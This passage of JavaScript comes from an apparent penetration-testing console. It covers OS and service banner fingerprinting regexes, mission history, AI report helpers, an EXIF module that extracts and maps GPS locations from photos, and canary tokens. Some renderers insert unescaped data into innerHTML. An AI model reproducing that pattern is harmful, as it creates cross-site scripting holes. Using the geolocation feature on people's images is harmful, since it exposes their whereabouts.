        /LiteSpeed/i, /\bcaddy\/[\d.]+/i, /Traefik\/[\d.]+/i, /\bH2O\/[\d.]+/i,
        /lighttpd\/[\d.]+/i, /gunicorn\/[\d.]+/i, /Werkzeug\/[\d.]+/i,
        /\bExpress\/[\d.]+/i, /Microsoft-HTTPAPI\/[\d.]+/i,
        /Microsoft-WebDAV-Mini-Redir/i, /Microsoft-IIS\/[\d.]+/i,
        /Apache\/[\d.]+/i, /nginx\/[\d.]+/i,

        // ── Service banners revealing OS ──
        /OpenSSH_[\d.]+p\d+(?:\s+Ubuntu-[\d.]+)?/i, /vsftpd\s+[\d.]+/i,
        /ProFTPD\s+[\d.a-zA-Z]+/i, /Microsoft FTP Service/i, /Serv-U FTP/i,
        /Samba\s+[\d.]+/i, /smbd\s+[\d.]+/i, /MySQL[\s\/][\d.]+/i,
        /PostgreSQL\s+[\d.]+/i, /Redis[\s=v]+[\d.]+/i,
        /\bMongoDB\s+[\d.]+/i,

        // ── Direct OS strings ──
        /\bWindows\s+Server\s+[\d.R]{1,20}/i,
        /\bWindows\s+(?:10|11|8\.1|8|7|XP|Vista)\b/i,
        /\bMicrosoft Windows\b/i,
        /\bLinux\s+[\d.]+\S*\s+\(([^)]+)\)/i,
        /\b(Ubuntu|Debian|CentOS|RHEL|Red Hat|Fedora|Alpine|Arch)\s*[\d.]*/i,
        /\bDarwin\s+[\d.]+/i, /\bFreeBSD\s+[\d.]+/i, /\bOpenBSD\s+[\d.]+/i,
        /\bSunOS\s+[\d.]+/i, /\bSolaris\s+[\d.]+/i, /\bAIX\s+[\d.]+/i,
        /\bAndroid\s+[\d.]+/i, /\b(iOS|iPhone OS)\s+[\d.]+/i,

        // ── Appliances / networking gear ──
        /\bMikroTik RouterOS\s+[\d.]+/i, /\bCisco-IOS.+?[\d.]+/i,
        /\bFortiOS\s+[\d.]+/i, /\bF5 BIG-IP\s+[\d.]+/i, /\bAirOS\s+[\d.]+/i,
        /\bJuniper\b/i, /\bRouterOS\b/i,
    ];

    function _detectOSFromFindings(finds) {
        if (!Array.isArray(finds)) return null;

        // Priority 1: explicit nmap OS detection (finding.type === 'os').
        const osFinding = finds.find(f => f && f.type === 'os' && f.detail);
        if (osFinding) {
            const s = String(osFinding.detail).slice(0, 80).trim();
            if (s) return s;
        }

        // Priority 2: catalog-based matching across all findings.
        for (const f of finds) {
            if (!f) continue;
            const txt = `${f.title || ''} ${f.detail || ''} ${f.service || ''} ${f.version || ''} ${f.banner || ''}`;
            for (const re of OS_PATTERNS) {
                const m = txt.match(re);
                if (m) {
                    // Use full matched substring (most informative), clipped to 80 chars.
                    const hit = (m[1] || m[0]).trim();
                    if (hit) return hit.slice(0, 80);
                }
            }
        }
        return null;
    }

    function _computeSuccessScore(finds) {
        if (!Array.isArray(finds) || finds.length === 0) return 0;
        const weights = { critical: 100, high: 50, medium: 20, low: 10, info: 5 };
        let score = 0;
        for (const f of finds) {
            const sev = (f.severity || 'info').toLowerCase();
            const w = weights[sev];
            if (w && w >= 50) score += w;     // only meaningful severities accumulate
            else if (w) score += 2;          // low/info contribute marginally
        }
        return Math.max(0, Math.min(100, score));
    }

    function _buildFindingsSummary(finds, top = 5) {
        if (!Array.isArray(finds) || finds.length === 0) return [];
        // Sort by severity weight desc
        const weights = { critical: 4, high: 3, medium: 2, low: 1, info: 0 };
        const sorted = [...finds].sort((a, b) =>
            (weights[(b.severity || 'info').toLowerCase()] || 0) -
            (weights[(a.severity || 'info').toLowerCase()] || 0)
        );
        return sorted.slice(0, top).map(f => ({
            severity: f.severity || 'info',
            tool: f.tool || 'unknown',
            title: (f.title || f.detail || f.path || f.service || 'finding').toString().slice(0, 120)
        }));
    }

    window.saveMission = async function () {
        const target = document.getElementById('target-ip')?.value?.trim() || 'unknown';
        const finds = window.findings || [];
        try {
            const payload = {
                target,
                os_detected: _detectOSFromFindings(finds) || 'unknown',
                tools_used: toolsUsedThisSession.slice(-20),  // last 20 tool invocations
                findings_count: finds.length,
                findings_summary: _buildFindingsSummary(finds, 5),
                plan_steps: (typeof missionPlan !== 'undefined' && Array.isArray(missionPlan)) ? missionPlan.length : 0,
                success_score: _computeSuccessScore(finds)
            };
            const resp = await fetch('/api/missions/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
            const data = await resp.json();
            showToast(`💾 Mission saved to history (score ${payload.success_score})`);
            // Auto-refresh list
            try { await window.loadMissionHistory(); } catch {}
            return data;
        } catch (err) {
            showToast(`⚠️ Save mission failed: ${err.message}`);
            return null;
        }
    };

    window.loadMissionHistory = async function () {
        const list = document.getElementById('mission-history-list');
        if (!list) return;
        try {
            const resp = await fetch('/api/missions?limit=20');
            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
            const data = await resp.json();
            const missions = Array.isArray(data) ? data : (data.data || data.missions || []);
            _missionHistoryCache = missions;
            if (!missions.length) {
                list.innerHTML = `<div class="text-center text-[10px] text-gray-700 py-4" data-i18n="missionEmpty">${translations.missionEmpty[window.currentLang] || 'No missions saved yet. Complete a scan and click "Save Mission".'}</div>`;
                return;
            }
            const scoreBadge = (score) => {
                score = Number(score) || 0;
                let cls = 'bg-red-900/40 text-red-400';
                if (score > 50) cls = 'bg-green-900/40 text-green-400';
                else if (score >= 20) cls = 'bg-amber-900/40 text-amber-400';
                return `<span class="text-[8px] px-1.5 py-0.5 rounded ${cls}">⭐ ${score}</span>`;
            };
            const fmtDate = (iso) => {
                try {
                    const d = new Date(iso);
                    return d.toLocaleDateString() + ' ' + d.toLocaleTimeString().slice(0, 5);
                } catch { return iso || ''; }
            };
            list.innerHTML = missions.map(m => `
                <div data-action="view-mission" data-mission-id="${m.id}"
                     class="bg-void border border-gray-800 hover:border-cyber/40 rounded p-2 cursor-pointer transition-all">
                    <div class="flex items-center justify-between gap-2 mb-1">
                        <span class="text-[10px] text-gray-300 font-mono truncate flex-1">📍 ${m.target || 'unknown'}</span>
                        ${scoreBadge(m.success_score)}
                    </div>
                    <div class="flex items-center gap-2 text-[9px] text-gray-700">
                        <span>🗂️ ${m.os_detected ? m.os_detected.slice(0, 28) : '—'}</span>
                        <span>·</span>
                        <span>📊 ${m.findings_count || 0}</span>
                        <span>·</span>
                        <span>📋 ${m.plan_steps || 0}</span>
                        <span class="ml-auto">${fmtDate(m.created_at)}</span>
                    </div>
                </div>
            `).join('');
        } catch (err) {
            list.innerHTML = `<div class="text-center text-[10px] text-gray-700 py-4">⚠️ Backend unavailable — /api/missions</div>`;
        }
    };

    window.viewMissionDetails = async function (missionId) {
        const m = _missionHistoryCache.find(x => x.id === missionId || x.id === String(missionId));
        if (!m) {
            showToast('⚠️ Mission not found in cache — refresh list');
            return;
        }
        // Print structured info to terminal for inspection (offline-first, no extra fetch)
        let lines = [];
        lines.push('\n═══════ MISSION DETAILS ═══════');
        lines.push(`  ID:         ${m.id}`);
        lines.push(`  Target:     ${m.target || 'unknown'}`);
        lines.push(`  OS/Tech:    ${m.os_detected || '—'}`);
        lines.push(`  Findings:   ${m.findings_count || 0}`);
        lines.push(`  Plan steps: ${m.plan_steps || 0}`);
        lines.push(`  Score:      ${m.success_score || 0}/100`);
        lines.push(`  Created:    ${m.created_at || '—'}`);
        if (Array.isArray(m.tools_used) && m.tools_used.length) {
            lines.push('  Tools used:');
            for (const t of m.tools_used.slice(0, 15)) {
                const cmd = (t.command || '').slice(0, 100);
                lines.push(`    • [${t.tool || 'manual'}] ${cmd}`);
            }
            if (m.tools_used.length > 15) lines.push(`    ... +${m.tools_used.length - 15} more`);
        }
        if (Array.isArray(m.findings_summary) && m.findings_summary.length) {
            lines.push('  Top findings:');
            for (const f of m.findings_summary) {
                lines.push(`    • [${(f.severity || 'info').toUpperCase()}] (${f.tool || '?'}) ${f.title || ''}`);
            }
        }
        lines.push('═══════════════════════════════\n');
        try { window.appendOutput(lines.join('\n')); } catch {}
        showToast(`📋 Mission details printed to terminal`);
    };

    // ── 🤖 Reports: Executive Summary ──
    window.reportsAskAI = async function () {
        const input = document.getElementById('reports-ai-question');
        if (!input || !input.value.trim()) return;
        const q = input.value.trim();
        input.disabled = true;
        const answer = document.getElementById('reports-ai-answer');
        if (answer) answer.textContent = '⏳ Thinking...';
        const reports = window.reports || [];
        const ctx = reports.slice(-5).map(r => `[${r.type}] ${r.title || r.target || 'untitled'}`).join('\n');
        const systemPrompt = `You are a penetration testing report analyst. Help with: executive summaries, vulnerability prioritization, remediation recommendations, and report formatting. Be concise and professional.`;
        try {
            const result = await window.aiChat(systemPrompt, `Recent reports:\n${ctx || 'No reports yet'}\n\nQuestion: ${q}`);
            if (answer) answer.textContent = result || '(no response)';
        } catch (e) {
            if (answer) answer.textContent = 'Error: ' + e.message;
        } finally {
            input.disabled = false;
            input.focus();
        }
    };

    window.reportsAskAIEnter = function (e) { if (e.key === 'Enter') reportsAskAI(); };

    // ── 🤖 Automation: Workflow Design ──
    window.automationAskAI = async function () {
        const input = document.getElementById('automation-ai-question');
        if (!input || !input.value.trim()) return;
        const q = input.value.trim();
        input.disabled = true;
        const answer = document.getElementById('automation-ai-answer');
        if (answer) answer.textContent = '⏳ Thinking...';
        const systemPrompt = `You are an n8n workflow automation expert for security operations. Help design automation workflows for: vulnerability scanning, recon automation, alerting, report generation, and threat intel feeds. Provide step-by-step workflow descriptions, node configurations, and trigger setups. Be concise and practical.`;
        try {
            const result = await window.aiChat(systemPrompt, `Workflow question: ${q}`);
            if (answer) answer.textContent = result || '(no response)';
        } catch (e) {
            if (answer) answer.textContent = 'Error: ' + e.message;
        } finally {
            input.disabled = false;
            input.focus();
        }
    };

    window.automationAskAIEnter = function (e) { if (e.key === 'Enter') automationAskAI(); };

    // ════════════════════════════════════════════════════════════════
    //  EXIF OSINT MODULE
    // ════════════════════════════════════════════════════════════════

    window.EXIF_STATE = {
        lastResult: null,
        lastImageDataUrl: null,
    };

    // Drop zone handlers
    document.getElementById('exif-dropzone')?.addEventListener('click', () => {
        document.getElementById('exif-file-input')?.click();
    });

    document.getElementById('exif-file-input')?.addEventListener('change', (e) => {
        const file = e.target.files?.[0];
        if (file) handleExifFile(file);
    });

    // Drag & drop
    const dropZone = document.getElementById('exif-dropzone');
    if (dropZone) {
        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.classList.add('border-neon', 'bg-neon/5');
        });
        dropZone.addEventListener('dragleave', () => {
            dropZone.classList.remove('border-neon', 'bg-neon/5');
        });
        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.classList.remove('border-neon', 'bg-neon/5');
            const file = e.dataTransfer.files?.[0];
            if (file && file.type.startsWith('image/')) {
                handleExifFile(file);
            }
        });
    }

    // URL button
    document.getElementById('exif-url-btn')?.addEventListener('click', () => {
        const url = document.getElementById('exif-url-input')?.value?.trim();
        if (url) handleExifUrl(url);
    });

    // URL input enter key
    document.getElementById('exif-url-input')?.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            document.getElementById('exif-url-btn')?.click();
        }
    });

    async function handleExifFile(file) {
        if (file.size > 20 * 1024 * 1024) {
            showExifError(window.currentLang === 'es' ? 'El archivo es demasiado grande (máx 20MB)' : 'File too large (max 20MB)');
            return;
        }

        // Preview
        const reader = new FileReader();
        reader.onload = (e) => {
            window.EXIF_STATE.lastImageDataUrl = e.target.result;
            document.getElementById('exif-preview').src = e.target.result;
        };
        reader.readAsDataURL(file);

        // Upload
        showExifLoading(true);
        hideExifError();

        const formData = new FormData();
        formData.append('file', file);

        try {
            const resp = await fetch('/api/exif/analyze', { method: 'POST', body: formData });
            const data = await resp.json();
            if (data.ok) {
                renderExifResults(data);
            } else {
                showExifError(data.error || 'Analysis failed');
            }
        } catch (err) {
            showExifError('Network error: ' + err.message);
        } finally {
            showExifLoading(false);
        }
    }

    async function handleExifUrl(url) {
        showExifLoading(true);
        hideExifError();

        try {
            const resp = await fetch(`/api/exif/analyze?url=${encodeURIComponent(url)}`);
            const data = await resp.json();
            if (data.ok) {
                // Clear file input preview, use URL as preview
                document.getElementById('exif-preview').src = url;
                window.EXIF_STATE.lastImageDataUrl = url;
                renderExifResults(data);
            } else {
                showExifError(data.error || 'Analysis failed');
            }
        } catch (err) {
            showExifError('Network error: ' + err.message);
        } finally {
            showExifLoading(false);
        }
    }

    function showExifLoading(show) {
        document.getElementById('exif-loading').classList.toggle('hidden', !show);
        document.getElementById('exif-results').classList.toggle('hidden', show);
    }

    function showExifError(msg) {
        const el = document.getElementById('exif-error');
        el.textContent = msg;
        el.classList.remove('hidden');
        document.getElementById('exif-results').classList.add('hidden');
    }

    function hideExifError() {
        document.getElementById('exif-error').classList.add('hidden');
    }

    function renderExifResults(data) {
        window.EXIF_STATE.lastResult = data;
        document.getElementById('exif-results').classList.remove('hidden');

        // Badge status
        const badge = document.getElementById('exif-status-badge');
        badge.textContent = data.has_exif
            ? (window.currentLang === 'es' ? 'EXIF Encontrado' : 'EXIF Found')
            : (window.currentLang === 'es' ? 'Sin EXIF' : 'No EXIF');
        badge.className = `px-3 py-1 rounded-full text-xs ${data.has_exif ? 'bg-green-900/50 text-green-400 border border-green-700' : 'bg-yellow-900/50 text-yellow-400 border border-yellow-700'}`;

        // Quick stats
        document.getElementById('exif-format').textContent = data.format || '-';
        document.getElementById('exif-dimensions').textContent = data.dimensions || '-';
        document.getElementById('exif-filesize').textContent = data.file_size_bytes ? formatExifBytes(data.file_size_bytes) : '-';
        document.getElementById('exif-hasexif').textContent = data.has_exif ? '✅ Yes' : '❌ No';

        // Severity banner
        const sevBanner = document.getElementById('exif-severity-banner');
        sevBanner.classList.remove('hidden');
        const sevColors = { high: 'bg-red-900/50 text-red-400 border border-red-700', medium: 'bg-yellow-900/50 text-yellow-400 border border-yellow-700', low: 'bg-blue-900/50 text-blue-400 border border-blue-700', info: 'bg-gray-800 text-gray-400 border border-gray-700' };
        const sevLabels = { high: window.currentLang === 'es' ? 'ALTO - Contiene datos de ubicación GPS' : 'HIGH - Contains GPS location data', medium: window.currentLang === 'es' ? 'MEDIO - Información de cámara detectada' : 'MEDIUM - Camera information detected', low: window.currentLang === 'es' ? 'BAJO - Metadatos básicos encontrados' : 'LOW - Basic metadata found', info: window.currentLang === 'es' ? 'INFO - Sin metadatos EXIF' : 'INFO - No EXIF metadata' };
        sevBanner.className = `px-4 py-3 rounded-lg text-sm font-mono ${sevColors[data.severity] || 'bg-gray-800 text-gray-400'}`;
        sevBanner.textContent = `\u26A0 ${sevLabels[data.severity] || data.severity}`;

        // GPS section
        const gpsSection = document.getElementById('exif-gps-section');
        if (data.gps) {
            gpsSection.classList.remove('hidden');
            document.getElementById('exif-lat').textContent = data.gps.lat?.toFixed(6) || '-';
            document.getElementById('exif-lon').textContent = data.gps.lon?.toFixed(6) || '-';
            document.getElementById('exif-altitude').textContent = data.gps.altitude != null ? `${data.gps.altitude}m` : '-';
            document.getElementById('exif-google-maps').href = data.gps.google_maps_url || '#';
            document.getElementById('exif-osm-link').href = data.gps.map_url || '#';

            // Geocoding
            const geocodeEl = document.getElementById('exif-geocode');
            if (data.geocoding) {
                geocodeEl.classList.remove('hidden');
                document.getElementById('exif-location-name').textContent = data.geocoding.display_name || `${data.geocoding.city || ''}, ${data.geocoding.country || ''}`;
            } else {
                geocodeEl.classList.add('hidden');
            }

            // Leaflet map
            initExifMap(data.gps.lat, data.gps.lon);
        } else {
            gpsSection.classList.add('hidden');
        }

        // Camera section
        const camSection = document.getElementById('exif-camera-section');
        if (data.camera) {
            camSection.classList.remove('hidden');
            const tbody = document.getElementById('exif-camera-table');
            const rows = [
                ['Make', data.camera.make],
                ['Model', data.camera.model],
                ['Lens', data.camera.lens],
                ['Focal Length', data.camera.focal_length],
                ['Aperture (F-Number)', data.camera.fnumber],
                ['ISO', data.camera.iso],
                ['Exposure Time', data.camera.exposure_time],
                ['Flash', data.camera.flash],
                ['Software', data.camera.software],
            ].filter(r => r[1] != null && r[1] !== '');
            tbody.innerHTML = '<thead class="sticky top-0 bg-void"><tr class="text-left text-gray-400 border-b border-cyber"><th class="px-4 py-2 font-mono text-xs">Property</th><th class="px-4 py-2 font-mono text-xs">Value</th></tr></thead>' +
                rows.map(([k, v]) => `<tr class="border-b border-cyber/50"><td class="px-4 py-2 text-gray-400">${k}</td><td class="px-4 py-2 text-white font-mono">${v}</td></tr>`).join('');
        } else {
            camSection.classList.add('hidden');
        }

        // Metadata section
        const metaSection = document.getElementById('exif-metadata-section');
        if (data.metadata) {
            metaSection.classList.remove('hidden');
            const tbody = document.getElementById('exif-metadata-table');
            const rows = [
                ['Date/Time Original', data.metadata.datetime_original],
                ['Date/Time Digitized', data.metadata.datetime_digitized],
                ['Artist', data.metadata.artist],
                ['Copyright', data.metadata.copyright],
                ['Description', data.metadata.description],
                ['X Resolution', data.metadata.x_resolution],
                ['Y Resolution', data.metadata.y_resolution],
                ['Orientation', data.metadata.orientation],
                ['Color Space', data.metadata.color_space],
            ].filter(r => r[1] != null && r[1] !== '');
            tbody.innerHTML = '<thead class="sticky top-0 bg-void"><tr class="text-left text-gray-400 border-b border-cyber"><th class="px-4 py-2 font-mono text-xs">Property</th><th class="px-4 py-2 font-mono text-xs">Value</th></tr></thead>' +
                rows.map(([k, v]) => `<tr class="border-b border-cyber/50"><td class="px-4 py-2 text-gray-400">${k}</td><td class="px-4 py-2 text-white font-mono">${v}</td></tr>`).join('');
        } else {
            metaSection.classList.add('hidden');
        }

        // Thumbnail section
        const thumbSection = document.getElementById('exif-thumbnail-section');
        if (data.thumbnail && data.thumbnail.has) {
            thumbSection.classList.remove('hidden');
            document.getElementById('exif-thumbnail-info').innerHTML = `
                <div class="grid grid-cols-2 gap-3">
                    <div><span class="text-gray-500">Size:</span> <span class="text-white font-mono">${formatExifBytes(data.thumbnail.size_bytes)}</span></div>
                    <div><span class="text-gray-500">Format:</span> <span class="text-white font-mono">${data.thumbnail.format || 'JPEG'}</span></div>
                </div>
            `;
        } else {
            thumbSection.classList.add('hidden');
        }

        // Raw tags
        const rawTbody = document.getElementById('exif-raw-tbody');
        const noExifMsg = document.getElementById('exif-no-exif-msg');
        if (data.raw_tags && Object.keys(data.raw_tags).length > 0) {
            noExifMsg.classList.add('hidden');
            rawTbody.innerHTML = Object.entries(data.raw_tags)
                .sort(([a], [b]) => a.localeCompare(b))
                .map(([k, v]) => `<tr class="border-b border-cyber/50 hover:bg-void/50"><td class="px-4 py-1.5 text-gray-400 font-mono text-xs">${k}</td><td class="px-4 py-1.5 text-white font-mono text-xs truncate max-w-md">${v}</td></tr>`)
                .join('');
        } else {
            noExifMsg.classList.remove('hidden');
            rawTbody.innerHTML = '';
        }

        // Add findings to global findings system
        if (data.findings) {
            data.findings.forEach(f => {
                if (typeof window.addFinding === 'function') {
                    window.addFinding(f);
                }
            });
        }
    }

    function initExifMap(lat, lon) {
        const mapContainer = document.getElementById('exif-map');
        // If Leaflet is available via CDN, use it
        if (typeof L !== 'undefined') {
            // Clear previous map instance
            if (window._exifMap) {
                window._exifMap.remove();
            }
            window._exifMap = L.map('exif-map').setView([lat, lon], 15);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; OpenStreetMap contributors'
            }).addTo(window._exifMap);
            L.marker([lat, lon]).addTo(window._exifMap)
                .bindPopup(`📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}`)
                .openPopup();
        } else {
            // Fallback: show static OSM image
            mapContainer.innerHTML = `<img src="https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x300&markers=${lat},${lon},red-pushpin" class="w-full h-full rounded-lg" alt="Map">`;
        }
    }

    function formatExifBytes(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    }

    // Export handlers
    document.getElementById('exif-export-md')?.addEventListener('click', () => exportExifReport('md'));
    document.getElementById('exif-export-html')?.addEventListener('click', () => exportExifReport('html'));
    document.getElementById('exif-export-pdf')?.addEventListener('click', () => exportExifReport('pdf'));
    document.getElementById('exif-copy-json')?.addEventListener('click', copyExifJSON);
    document.getElementById('exif-clear')?.addEventListener('click', clearExif);

    function exportExifReport(format) {
        const data = window.EXIF_STATE.lastResult;
        if (!data) return;

        let content = '';
        const filename = `exif-report-${data.filename || 'image'}`;

        if (format === 'md') {
            content = buildExifMarkdown(data);
            downloadString(content, `${filename}.md`, 'text/markdown');
        } else if (format === 'html') {
            content = buildExifHTML(data);
            downloadString(content, `${filename}.html`, 'text/html');
        } else if (format === 'pdf') {
            content = buildExifHTML(data);
            openPDFPreview(content);
        }
    }

    function buildExifMarkdown(data) {
        let md = `# EXIF Metadata Report\n\n`;
        md += `**File:** ${data.filename || 'Unknown'}\n`;
        md += `**Format:** ${data.format}\n`;
        md += `**Dimensions:** ${data.dimensions}\n`;
        md += `**File Size:** ${formatExifBytes(data.file_size_bytes)}\n`;
        md += `**Has EXIF:** ${data.has_exif ? 'Yes' : 'No'}\n`;
        md += `**Severity:** ${data.severity.toUpperCase()}\n\n`;

        if (data.gps) {
            md += `## 📍 GPS Location\n\n`;
            md += `- Latitude: ${data.gps.lat}\n`;
            md += `- Longitude: ${data.gps.lon}\n`;
            if (data.gps.altitude != null) md += `- Altitude: ${data.gps.altitude}m\n`;
            md += `- OpenStreetMap: ${data.gps.map_url}\n`;
            md += `- Google Maps: ${data.gps.google_maps_url}\n`;
            if (data.geocoding) {
                md += `- Location: ${data.geocoding.display_name || `${data.geocoding.city}, ${data.geocoding.country}`}\n`;
            }
            md += '\n';
        }

        if (data.camera) {
            md += `## 📸 Camera Information\n\n`;
            Object.entries(data.camera).forEach(([k, v]) => {
                if (v != null && v !== '') md += `- **${k}:** ${v}\n`;
            });
            md += '\n';
        }

        if (data.metadata) {
            md += `## 📝 Metadata\n\n`;
            Object.entries(data.metadata).forEach(([k, v]) => {
                if (v != null && v !== '') md += `- **${k}:** ${v}\n`;
            });
            md += '\n';
        }

        if (data.raw_tags && Object.keys(data.raw_tags).length > 0) {
            md += `## 📋 All EXIF Tags (${Object.keys(data.raw_tags).length})\n\n`;
            md += `| Tag | Value |\n|-----|-------|\n`;
            Object.entries(data.raw_tags).forEach(([k, v]) => {
                md += `| ${k} | ${v} |\n`;
            });
        }

        md += `\n---\n*Generated by MIRV EXIF OSINT Module*\n`;
        return md;
    }

    function buildExifHTML(data) {
        const isDark = !document.body.classList.contains('monochrome');
        const bg = isDark ? '#0b0e14' : '#1a1a2e';
        const card = isDark ? '#111520' : '#16213e';
        const border = isDark ? '#1a1f2e' : '#0f3460';
        const text = '#e0e0e0';
        const neon = isDark ? '#d4a843' : '#3b8f8a';

        let html = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>EXIF Report - ${data.filename || 'image'}</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:${bg};color:${text};font-family:'Courier New',monospace;padding:20px}.container{max-width:800px;margin:0 auto}h1{color:${neon};border-bottom:2px solid ${neon};padding-bottom:10px;margin-bottom:20px}h2{color:${neon};margin-top:25px;margin-bottom:10px}table{width:100%;border-collapse:collapse;margin:10px 0 20px}th,td{padding:8px 12px;text-align:left;border:1px solid ${border}}th{background:${card};color:${neon}}td{background:${bg}}.sev-high{color:#ff4444}.sev-medium{color:#ffaa00}.sev-low{color:#44aaff}.sev-info{color:#888}.tag{font-size:0.9em;color:#aaa}a{color:${neon}}.footer{margin-top:40px;padding-top:15px;border-top:1px solid ${border};font-size:0.8em;color:#666}</style></head><body><div class="container">`;

        html += `<h1>📷 EXIF Metadata Report</h1>`;
        html += `<table><tr><th>Property</th><th>Value</th></tr>`;
        html += `<tr><td>File</td><td>${data.filename || 'Unknown'}</td></tr>`;
        html += `<tr><td>Format</td><td>${data.format}</td></tr>`;
        html += `<tr><td>Dimensions</td><td>${data.dimensions}</td></tr>`;
        html += `<tr><td>File Size</td><td>${formatExifBytes(data.file_size_bytes)}</td></tr>`;
        const sevClass = `sev-${data.severity}`;
        html += `<tr><td>Severity</td><td class="${sevClass}">${data.severity.toUpperCase()}</td></tr>`;
        html += `</table>`;

        if (data.gps) {
            html += `<h2>📍 GPS Location</h2><table>`;
            html += `<tr><td>Latitude</td><td>${data.gps.lat}</td></tr>`;
            html += `<tr><td>Longitude</td><td>${data.gps.lon}</td></tr>`;
            if (data.gps.altitude != null) html += `<tr><td>Altitude</td><td>${data.gps.altitude}m</td></tr>`;
            html += `<tr><td>Map</td><td><a href="${data.gps.map_url}" target="_blank">OpenStreetMap</a> | <a href="${data.gps.google_maps_url}" target="_blank">Google Maps</a></td></tr>`;
            if (data.geocoding) {
                html += `<tr><td>Location</td><td>${data.geocoding.display_name || ''}</td></tr>`;
            }
            html += `</table>`;
        }

        if (data.camera) {
            html += `<h2>📸 Camera</h2><table>`;
            Object.entries(data.camera).forEach(([k, v]) => {
                if (v != null && v !== '') html += `<tr><td>${k}</td><td>${v}</td></tr>`;
            });
            html += `</table>`;
        }

        if (data.metadata) {
            html += `<h2>📝 Metadata</h2><table>`;
            Object.entries(data.metadata).forEach(([k, v]) => {
                if (v != null && v !== '') html += `<tr><td>${k}</td><td>${v}</td></tr>`;
            });
            html += `</table>`;
        }

        if (data.raw_tags && Object.keys(data.raw_tags).length > 0) {
            html += `<h2>📋 All Tags (${Object.keys(data.raw_tags).length})</h2><table><tr><th>Tag</th><th>Value</th></tr>`;
            Object.entries(data.raw_tags).forEach(([k, v]) => {
                html += `<tr><td class="tag">${k}</td><td>${v}</td></tr>`;
            });
            html += `</table>`;
        }

        html += `<div class="footer">Generated by MIRV EXIF OSINT Module &bull; ${new Date().toISOString()}</div>`;
        html += `</div></body></html>`;
        return html;
    }

    function copyExifJSON() {
        const data = window.EXIF_STATE.lastResult;
        if (!data) return;
        navigator.clipboard.writeText(JSON.stringify(data, null, 2)).then(() => {
            const btn = document.getElementById('exif-copy-json');
            const orig = btn.textContent;
            btn.textContent = '✅ Copied!';
            setTimeout(() => btn.textContent = orig, 2000);
        });
    }

    function clearExif() {
        window.EXIF_STATE = { lastResult: null, lastImageDataUrl: null };
        document.getElementById('exif-results').classList.add('hidden');
        document.getElementById('exif-error').classList.add('hidden');
        document.getElementById('exif-file-input').value = '';
        document.getElementById('exif-url-input').value = '';
        document.getElementById('exif-preview').src = '';
        document.getElementById('exif-status-badge').textContent = window.currentLang === 'es' ? 'Listo' : 'Ready';
        document.getElementById('exif-status-badge').className = 'px-3 py-1 rounded-full text-xs bg-void border border-cyber text-gray-400';
        const gpsSection = document.getElementById('exif-gps-section');
        if (gpsSection) gpsSection.classList.add('hidden');
        document.getElementById('exif-camera-section')?.classList.add('hidden');
        document.getElementById('exif-metadata-section')?.classList.add('hidden');
        document.getElementById('exif-thumbnail-section')?.classList.add('hidden');
        document.getElementById('exif-no-exif-msg')?.classList.add('hidden');
        document.getElementById('exif-raw-tbody').innerHTML = '';
        document.getElementById('exif-severity-banner').classList.add('hidden');
        if (window._exifMap) {
            window._exifMap.remove();
            window._exifMap = null;
        }
    }

    // ════════════════════════════════════════════════════════════════
    //  CANARY TOKENS MODULE
    // ════════════════════════════════════════════════════════════════

    // Generate button
    document.getElementById('canary-generate-btn')?.addEventListener('click', generateCanaryToken);

    // Allow Enter key on inputs
    ['canary-name', 'canary-notes'].forEach(id => {
        document.getElementById(id)?.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') generateCanaryToken();
        });
    });

    async function generateCanaryToken() {
        const type = document.getElementById('canary-type')?.value;
        const name = document.getElementById('canary-name')?.value?.trim() || '';
        const notes = document.getElementById('canary-notes')?.value?.trim() || '';

        document.getElementById('canary-loading')?.classList.remove('hidden');
        hideCanaryError();

        try {
            const formData = new URLSearchParams();
            formData.append('token_type', type);
            formData.append('name', name);
            formData.append('notes', notes);

            const resp = await fetch('/api/canary/token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData
            });
            const data = await resp.json();
            if (data.ok) {
                document.getElementById('canary-name').value = '';
                document.getElementById('canary-notes').value = '';
                await refreshCanaryTokens();
                await refreshCanaryEvents();
                if (data.findings && typeof window.addFinding === 'function') {
                    data.findings.forEach(f => window.addFinding(f));
                }
            } else {
                showCanaryError(data.error || 'Generation failed');
            }
        } catch (err) {
            showCanaryError('Network error: ' + err.message);
        } finally {
            document.getElementById('canary-loading')?.classList.add('hidden');
        }
    }

    async function refreshCanaryTokens() {
        try {
            const resp = await fetch('/api/canary/tokens');
            const data = await resp.json();
            if (!data.ok) return;

            const list = document.getElementById('canary-tokens-list');
            const empty = document.getElementById('canary-empty');
            const count = document.getElementById('canary-count');

            count.textContent = `${data.count} active`;

            if (data.count === 0) {
                empty?.classList.remove('hidden');
                list.innerHTML = '';
                return;
            }

            empty?.classList.add('hidden');
            list.innerHTML = data.tokens.map(t => buildCanaryTokenCard(t)).join('');
        } catch (err) {
            console.error('Failed to refresh tokens:', err);
        }
    }

    async function refreshCanaryEvents() {
        try {
            const resp = await fetch('/api/canary/events');
            const data = await resp.json();
            if (!data.ok) return;

            const list = document.getElementById('canary-events-list');
            const empty = document.getElementById('canary-events-empty');

            if (data.count === 0) {
                empty?.classList.remove('hidden');
                list.innerHTML = '';
                return;
            }

            empty?.classList.add('hidden');
            list.innerHTML = data.events.map(e => buildCanaryEventRow(e)).join('');
        } catch (err) {
            console.error('Failed to refresh events:', err);
        }
    }

    function buildCanaryTokenCard(t) {
        const colors = {
            'api-key': 'border-l-blue-500', 'db-url': 'border-l-green-500', 'jwt': 'border-l-purple-500',
